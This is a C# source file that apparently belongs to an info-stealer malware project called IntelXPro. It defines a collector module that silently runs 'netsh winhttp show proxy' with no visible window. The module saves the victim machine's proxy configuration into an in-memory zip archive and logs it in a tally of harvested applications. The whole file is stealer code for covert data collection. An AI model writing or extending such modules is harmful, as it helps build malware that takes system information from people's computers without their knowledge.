using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;
using System;
using System.Diagnostics;
using System.Text;

namespace IntelXPro.src.IntelXPro.Stealer.Network
{
    internal class ProxySettings : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                var networkApp = new Counter.CounterApplications { Name = "Proxy Settings" };
                StringBuilder sb = new StringBuilder();
                
                sb.AppendLine("[Proxy Settings]");
                sb.AppendLine($"Collected at: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                sb.AppendLine();
                
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "netsh";
                    process.StartInfo.Arguments = "winhttp show proxy";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    sb.AppendLine(output);
                }
                
                string targetPath = "Network\\proxy_settings.txt";
                zip.AddTextFile(targetPath, sb.ToString());
                networkApp.Files.Add(targetPath);
                
                if (networkApp.Files.Count > 0)
                {
                    counter.Applications.Add(networkApp);
                }
            }
            catch (Exception ex)
            {
                var networkApp = new Counter.CounterApplications { Name = "Proxy Settings" };
                StringBuilder errorSb = new StringBuilder();
                errorSb.AppendLine("[Proxy Settings]");
                errorSb.AppendLine($"Error collecting proxy settings: {ex.Message}");
                
                string targetPath = "Network\\proxy_settings.txt";
                zip.AddTextFile(targetPath, errorSb.ToString());
                networkApp.Files.Add(targetPath);
                counter.Applications.Add(networkApp);
            }
        }
    }
}
